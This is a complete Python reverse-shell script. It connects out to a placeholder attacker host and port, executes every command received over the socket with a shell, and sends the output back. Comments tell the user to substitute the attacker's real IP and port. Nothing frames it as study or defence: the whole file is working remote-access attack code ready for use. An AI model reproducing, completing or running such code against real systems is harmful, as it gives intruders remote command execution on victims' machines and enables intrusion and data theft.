import socket
import subprocess

# Attacker's IP and port (replace with actual values)
REMOTE_HOST = "127.0.0.1"  # Replace with your attacker's IP address
REMOTE_PORT = 443          # Replace with your attacker's port

def reverse_shell():
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the attacker's machine
        s.connect((REMOTE_HOST, REMOTE_PORT))

        while True:
            # Receive a command from the attacker
            command = s.recv(1024).decode('utf-8')

            if command.lower() == 'exit':
                # If 'exit' command is received, break out of the loop and close connection
                break

            if command.strip():
                # Execute the command received
                output = subprocess.run(command, shell=True, capture_output=True, text=True)

                # Send the result (stdout and stderr) back to the attacker
                s.send(output.stdout.encode('utf-8') + output.stderr.encode('utf-8'))
            else:
                # Send an empty message back if the command was blank
                s.send(b'')
    except Exception as e:
        print(f"Error: {e}")
    finally:
        # Close the socket connection
        s.close()

if __name__ == "__main__":
    reverse_shell()
